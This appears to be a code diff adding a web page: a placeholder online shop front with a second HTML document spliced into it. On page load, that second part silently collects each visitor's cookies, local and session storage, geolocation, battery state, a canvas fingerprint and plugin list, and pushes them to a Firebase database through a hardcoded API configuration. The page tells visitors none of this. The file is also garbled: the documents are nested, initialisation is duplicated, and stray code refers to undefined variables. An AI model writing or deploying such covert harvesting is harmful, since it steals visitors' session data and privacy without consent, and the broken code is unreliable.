@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shop</title>
+     <!-- Styles -->
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .welcome {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .products {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+        }
+        .product {
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-shadow: 0 0 5px rgba(0,0,0,0.1);
+            margin: 10px;
+            padding: 20px;
+            width: 30%;
+        }
+        .product img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <img src="logo.png" alt="Logo" width="100">
+            <h1>Welcome to Our Shop</h1>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Welcome Message -->
+        <div class="welcome">
+            <p>Welcome to our online shop. Check out our products below:</p>
+        </div>
+
+        <!-- Products Section -->
+        <div class="products">
+            <div class="product">
+                <img src="product1.jpg" alt="Product 1">
+                <h3>Product 1</h3>
+                <p>Description of Product 1.</p>
+                <button onclick="storeInformation('Product 1')">Add to Cart</button>
+            </div>
+            <div class="product">
+                <img src="product2.jpg" alt="Product 2">
+                <h3>Product 2</h3>
+                <p>Description of Product 2.</p>
+                <button onclick="storeInformation('Product 2')">Add to Cart</button>
+            </div>
+            <div class="product">
+                <img src="product3.jpg" alt="Product 3">
+                <h3>Product 3</h3>
+                <p>Description of Product 3.</p>
+                <button onclick="storeInformation('Product 3')">Add to Cart</button>
+            </div>
+        </div>
+    </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information to Firebase</title>
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.5.0/firebase-database.js"></script>
+    <script>
+        // Initialize Firebase
+  const firebaseConfig = {
+    apiKey: "AIzaSyBCJ9FZDZSwZTF9uCsk5NkQX73v6WR_1E4",
+    authDomain: "devive-7e95d.firebaseapp.com",
+    databaseURL: "https://devive-7e95d-default-rtdb.firebaseio.com",
+    projectId: "devive-7e95d",
+    storageBucket: "devive-7e95d.appspot.com",
+    messagingSenderId: "840115890947",
+    appId: "1:840115890947:web:8e23657b9469912e1fd736"
+  };
+        firebase.initializeApp(firebaseConfig);
+
+        // Function to store device information
+        function storeDeviceInfo() {
+            var database = firebase.database();
+            var ref = database.ref('device_info');
+
+            var data = {
+                userAgent: navigator.userAgent,
+                screenSize: {
+                    width: window.screen.width,
+                    height: window.screen.height
+                },
+                viewportSize: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                geolocation: null, // will be updated asynchronously below
+                deviceOrientation: window.orientation,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                networkInfo: getNetworkInfo(),
+                batteryStatus: null, // will be updated asynchronously below
+                canvasFingerprint: generateCanvasFingerprint(),
+                refererUrl: document.referrer,
+                installedPlugins: getInstalledPlugins()
+            };
+
+            // Get geolocation (if supported)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    data.geolocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    // Update Firebase after geolocation is retrieved
+                    updateFirebase(ref, data);
+                }, function(error) {
+                    console.error('Geolocation error:', error);
+                    // Update Firebase with null geolocation
+                    updateFirebase(ref, data);
+                });
+            } else {
+                console.warn('Geolocation is not supported.');
+                // Update Firebase with null geolocation
+                updateFirebase(ref, data);
+            }
+
+            // Get battery status (if supported)
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    data.batteryStatus = {
+                        level: battery.level,
+                        charging: battery.charging
+                    };
+                    // Update Firebase after battery status is retrieved
+                    updateFirebase(ref, data);
+                }).catch(function(error) {
+                    console.error('Battery status error:', error);
+                    // Update Firebase with null battery status
+                    updateFirebase(ref, data);
+                });
+            } else {
+                console.warn('Battery status is not supported.');
+                // Update Firebase with null battery status
+                updateFirebase(ref, data);
+            }
+
+            // Function to update Firebase database
+            function updateFirebase(ref, data) {
+                ref.push(data)
+                   .then(() => {
+                       console.log("Data successfully pushed to Firebase:", data);
+                   })
+                   .catch((error) => {
+                       console.error("Error pushing data to Firebase:", error);
+                   });
+            }
+
+            // Function to get network information
+            function getNetworkInfo() {
+                var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (connection) {
+                    return {
+                        type: connection.type,
+                        effectiveType: connection.effectiveType
+                    };
+                } else {
+                    return 'Network information not supported.';
+                }
+            }
+
+            // Function to generate canvas fingerprint
+            function generateCanvasFingerprint() {
+                var canvas = document.createElement('canvas');
+                var ctx = canvas.getContext('2d');
+                var txt = 'Canvas Fingerprint';
+                ctx.textBaseline = 'top';
+                ctx.font = '14px "Arial"';
+                ctx.textBaseline = 'alphabetic';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = '#069';
+                ctx.fillText(txt, 2, 15);
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillText(txt, 4, 17);
+                return canvas.toDataURL();
+            }
+
+            // Function to get installed plugins
+            function getInstalledPlugins() {
+                var pluginsList = '';
+                for (var i = 0; i < navigator.plugins.length; i++) {
+                    pluginsList += navigator.plugins[i].name + ', ';
+                }
+                return pluginsList;
+            }
+        }
+
+        // Call storeDeviceInfo function when the page loads
+        window.onload = function() {
+            storeDeviceInfo();
+        };
+console.log("Initializing Firebase...");
+firebase.initializeApp(firebaseConfig);
+
+// Log each step to ensure function execution
+console.log("Attempting to store device information...");
+
+// Inside storeDeviceInfo() function, log key steps and data being prepared
+
+// Example:
+console.log("Data to be stored:", data);
+
+// Log Firebase operations
+ref.push(data)
+   .then(() => {
+       console.log("Data successfully pushed to Firebase:", data);
+   })
+   .catch((error) => {
+       console.error("Error pushing data to Firebase:", error);
+   });
+
+    </script>
+</head>
+<body>
+    <h1>Device Information to Firebase</h1>
+    <!-- Placeholder for displaying information (optional) -->
+</body>
+</html>
+
+</body>
+</html>
